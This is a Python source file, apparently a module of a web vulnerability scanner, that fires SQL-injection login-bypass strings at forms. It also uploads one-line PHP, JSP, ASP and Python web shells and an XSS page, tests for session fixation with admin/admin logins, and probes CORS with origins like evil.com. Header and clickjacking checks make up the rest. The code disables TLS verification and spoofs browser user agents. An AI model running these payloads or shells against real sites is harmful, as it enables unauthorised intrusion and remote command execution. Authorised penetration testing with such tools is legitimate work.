
import requests
import re
import hashlib
import base64
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style
import time
import random

class ExtraScanners:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)'
        ]
    
    def authentication_bypass_scanner(self, url):
        vulnerabilities = []
        bypass_payloads = [
            "admin'--",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "') or '1'='1--",
            "') or ('1'='1--",
            "admin' or '1'='1",
            "' union select 1,'admin','admin'--",
            "admin'||'1'='1",
            "' or 'a'='a",
            "') or ('a'='a",
            "' or 1=1 limit 1--",
            "admin'='admin",
            "' or username='admin'--"
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for Authentication Bypass...{Style.RESET_ALL}")
        
        auth_patterns = [
            r"welcome.*admin",
            r"dashboard",
            r"logout",
            r"admin.*panel",
            r"user.*profile",
            r"authentication.*success"
        ]
        
        for payload in bypass_payloads:
            try:
                data = {
                    'username': payload,
                    'password': payload,
                    'login': 'Login',
                    'user': payload,
                    'pass': payload,
                    'email': payload
                }
                
                response = self.session.post(url, data=data)
                
                for pattern in auth_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vuln = {
                            'type': 'Authentication Bypass',
                            'url': url,
                            'payload': payload,
                            'evidence': pattern
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}Auth Bypass found: {payload}{Style.RESET_ALL}")
                        break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def file_upload_scanner(self, url):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for File Upload vulnerabilities...{Style.RESET_ALL}")
        
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('shell.asp', '<%eval request("cmd")%>', 'application/x-asp'),
            ('shell.py', 'import os; os.system(input())', 'text/x-python'),
            ('test.html', '<script>alert("XSS")</script>', 'text/html')
        ]
        
        for filename, content, content_type in malicious_files:
            try:
                files = {'file': (filename, content, content_type)}
                response = self.session.post(url, files=files)
                
                if (response.status_code == 200 and 
                    ('upload' in response.text.lower() or 
                     'success' in response.text.lower() or
                     filename in response.text)):
                    
                    vuln = {
                        'type': 'File Upload Vulnerability',
                        'url': url,
                        'filename': filename,
                        'evidence': 'File upload appears successful'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}File Upload vulnerability: {filename}{Style.RESET_ALL}")
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def session_fixation_scanner(self, url):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for Session Fixation...{Style.RESET_ALL}")
        
        try:
            session1 = requests.Session()
            response1 = session1.get(url)
            
            if 'Set-Cookie' in response1.headers:
                cookies_before = session1.cookies
                
                login_data = {
                    'username': 'admin',
                    'password': 'admin',
                    'login': 'Login'
                }
                
                login_response = session1.post(url, data=login_data)
                cookies_after = session1.cookies
                
                if cookies_before == cookies_after:
                    vuln = {
                        'type': 'Session Fixation',
                        'url': url,
                        'evidence': 'Session ID not regenerated after login'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}Session Fixation vulnerability found{Style.RESET_ALL}")
        
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def clickjacking_scanner(self, url):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for Clickjacking vulnerabilities...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url)
            
            x_frame_options = response.headers.get('X-Frame-Options', '').lower()
            csp_header = response.headers.get('Content-Security-Policy', '').lower()
            
            vulnerable = True
            
            if x_frame_options in ['deny', 'sameorigin']:
                vulnerable = False
            
            if 'frame-ancestors' in csp_header:
                vulnerable = False
            
            if vulnerable:
                vuln = {
                    'type': 'Clickjacking',
                    'url': url,
                    'evidence': 'Missing X-Frame-Options or CSP frame-ancestors'
                }
                vulnerabilities.append(vuln)
                print(f"{Fore.RED}Clickjacking vulnerability found{Style.RESET_ALL}")
        
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def cors_scanner(self, url):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for CORS misconfigurations...{Style.RESET_ALL}")
        
        test_origins = [
            'https://evil.com',
            'http://attacker.com',
            'null',
            'http://localhost',
            'https://subdomain.target.com'
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(url, headers=headers)
                
                cors_header = response.headers.get('Access-Control-Allow-Origin', '')
                
                if cors_header == '*' or cors_header == origin:
                    vuln = {
                        'type': 'CORS Misconfiguration',
                        'url': url,
                        'origin': origin,
                        'evidence': f'CORS allows origin: {cors_header}'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}CORS misconfiguration: {origin}{Style.RESET_ALL}")
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def security_headers_scanner(self, url):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for missing security headers...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url)
            
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age',
                'Content-Security-Policy': 'default-src',
                'Referrer-Policy': 'strict-origin'
            }
            
            for header, expected in security_headers.items():
                if header not in response.headers:
                    vuln = {
                        'type': 'Missing Security Header',
                        'url': url,
                        'header': header,
                        'evidence': f'Missing {header} header'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}Missing header: {header}{Style.RESET_ALL}")
        
        except Exception as e:
            pass
        
        return vulnerabilities
